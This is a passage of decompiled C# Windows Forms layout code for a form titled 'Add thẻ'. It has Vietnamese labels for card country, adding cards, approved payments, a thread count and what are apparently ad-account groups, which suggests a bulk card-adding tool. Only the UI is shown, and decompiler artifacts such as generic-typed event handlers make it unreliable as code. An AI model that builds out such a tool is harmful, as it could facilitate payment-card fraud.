		this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(54, 16);
		this.label1.TabIndex = 49;
		this.label1.Text = "Thread:";
		this.numThread.Location = new System.Drawing.Point(727, 16);
		this.numThread.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.numThread.Maximum = new decimal((int[])(object)new T10[4]
		{
			(T10)999999999,
			default(T10),
			default(T10),
			default(T10)
		});
		this.numThread.Name = "numThread";
		this.numThread.Size = new System.Drawing.Size(92, 22);
		this.numThread.TabIndex = 50;
		this.numThread.ValueChanged += new System.EventHandler(numThread_ValueChanged<T18, T12, T13>);
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(356, 27);
		this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(85, 16);
		this.label2.TabIndex = 52;
		this.label2.Text = "Quốc gia thẻ:";
		this.txtCountryCard.Location = new System.Drawing.Point(459, 22);
		this.txtCountryCard.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.txtCountryCard.Name = "txtCountryCard";
		this.txtCountryCard.Size = new System.Drawing.Size(68, 22);
		this.txtCountryCard.TabIndex = 2;
		this.txtCountryCard.TextChanged += new System.EventHandler(txtCountryCard_TextChanged);
		this.groupBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.groupBox1.Controls.Add(this.label3);
		this.groupBox1.Controls.Add(this.txtLog);
		this.groupBox1.Location = new System.Drawing.Point(7, 660);
		this.groupBox1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.groupBox1.Size = new System.Drawing.Size(1197, 123);
		this.groupBox1.TabIndex = 53;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Log";
		this.label3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(121, -74);
		this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(14, 16);
		this.label3.TabIndex = 2;
		this.label3.Text = "0";
		this.txtLog.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtLog.Location = new System.Drawing.Point(8, 23);
		this.txtLog.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.txtLog.Multiline = true;
		this.txtLog.Name = "txtLog";
		this.txtLog.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtLog.Size = new System.Drawing.Size(1183, 91);
		this.txtLog.TabIndex = 0;
		this.cbAddCard.AutoSize = true;
		this.cbAddCard.Checked = true;
		this.cbAddCard.CheckState = System.Windows.Forms.CheckState.Checked;
		this.cbAddCard.ForeColor = System.Drawing.Color.Red;
		this.cbAddCard.Location = new System.Drawing.Point(827, 17);
		this.cbAddCard.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.cbAddCard.Name = "cbAddCard";
		this.cbAddCard.Size = new System.Drawing.Size(75, 20);
		this.cbAddCard.TabIndex = 51;
		this.cbAddCard.Text = "Add thẻ";
		this.cbAddCard.UseVisualStyleBackColor = true;
		this.cbAddCard.CheckedChanged += new System.EventHandler(cbAddCard_CheckedChanged<T11, T12, T13>);
		this.cbApprovedPayment.AutoSize = true;
		this.cbApprovedPayment.Checked = true;
		this.cbApprovedPayment.CheckState = System.Windows.Forms.CheckState.Checked;
		this.cbApprovedPayment.ForeColor = System.Drawing.Color.Red;
		this.cbApprovedPayment.Location = new System.Drawing.Point(919, 17);
		this.cbApprovedPayment.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.cbApprovedPayment.Name = "cbApprovedPayment";
		this.cbApprovedPayment.Size = new System.Drawing.Size(145, 20);
		this.cbApprovedPayment.TabIndex = 54;
		this.cbApprovedPayment.Text = "Approved Payment";
		this.cbApprovedPayment.UseVisualStyleBackColor = true;
		this.cbApprovedPayment.CheckedChanged += new System.EventHandler(cbApprovedPayment_CheckedChanged<T11, T12, T13>);
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1211, 798);
		base.Controls.Add(this.cbApprovedPayment);
		base.Controls.Add(this.cbAddCard);
		base.Controls.Add(this.groupBox1);
		base.Controls.Add(this.txtCountryCard);
		base.Controls.Add(this.label2);
		base.Controls.Add(this.numThread);
		base.Controls.Add(this.label1);
		base.Controls.Add(this.btnStart);
		base.Controls.Add(this.splitContainer1);
		base.Controls.Add(this.lbStatus);
		base.Icon = (System.Drawing.Icon)(T19)((System.Resources.ResourceManager)val).GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		base.Name = "frmAddCard";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Add thẻ";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(frmAddCard_FormClosing<T18, T12, T20>);
		base.Load += new System.EventHandler(frmAddCard_Load);
		((System.ComponentModel.ISupportInitialize)this.gvCard).EndInit();
		this.splitContainer1.Panel1.ResumeLayout(false);
		this.splitContainer1.Panel1.PerformLayout();
		this.splitContainer1.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splitContainer1).EndInit();
		this.splitContainer1.ResumeLayout(false);
		this.grouplỗi.ResumeLayout(false);
		this.grouplỗi.PerformLayout();
		this.groupDone.ResumeLayout(false);
		this.groupDone.PerformLayout();
		this.groupTKQC.ResumeLayout(false);
		this.groupTKQC.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numThread).EndInit();
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
